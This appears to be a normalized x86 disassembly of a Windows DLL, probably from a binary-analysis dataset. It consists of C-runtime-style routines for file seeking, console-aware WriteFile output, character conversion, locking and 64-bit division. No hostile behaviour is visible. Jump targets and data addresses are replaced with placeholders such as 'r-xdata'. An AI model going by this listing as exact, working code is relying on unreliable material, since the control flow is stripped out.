pop ebp
retn
xor eax eax
push esi
call sub_10010d42
push eax
call sub_10014436
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10010fac
push 0x14
push r--data
call sub_1000f940
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001107d
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1000f985
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_100106aa
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1001104e
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10010f61
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10010f61
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10011097
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1001416e
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1000b824
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_1001111c
push 0x14
push r--data
call sub_1000f940
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000f985
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100141d7
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011097
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100111fc
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10011206
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10013210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_1000b811
mov [ eax ] edi
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008d64
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
jmp r-xdata
push esi
call sub_10011a20
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_10011097
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1000bc4d
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_1000b7fe
mov [ eax ] 0x1c
call sub_1000b811
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_1000b824
pop ecx
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10010142
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1001450f
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_1001210f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_1001210f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1001450f
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10011903
push 0x10
push r--data
call sub_1000f940
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000f985
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100141d7
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10011206
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100119cf
mov eax [ ebp - 0x1c ]
sub_100119d7
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1000f158
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_10011a20
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_10011a76
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10011aaf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
call sub_1000b7ac
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x2a
call sub_1000b7fe
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1000b7fe
push 0x22
pop esi
mov [ eax ] esi
call sub_1000b7ac
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1000ffa0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1000ffa0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10011c30
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10011cc5
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10011d0f
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10009957
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_10011d7d
push 0xc
push r--data
call sub_1000f940
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1000f01a
push 0x1e
call sub_1000ee6b
push 0xff
call sub_1000ebaa
push 0x18
call sub_1000f158
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1000f985
retn
push edi
call sub_10009957
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10009957
pop ecx
call sub_1000b7fe
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011e36
mov eax [ ebp - 0x1c ]
sub_10011e3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10011d7d
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1000ee27
sub_10011e72
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_10010d42
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1001455a
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_10010d42
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
push esi
call sub_10010d42
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10010d42
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10010d42
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10010d42
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_10010d42
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10010d42
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10010d42
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10010d42
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10011c04
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_10010d42
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10010d42
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_1000a821
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_10011ff9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1001010a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1000b7fe
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10012129
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
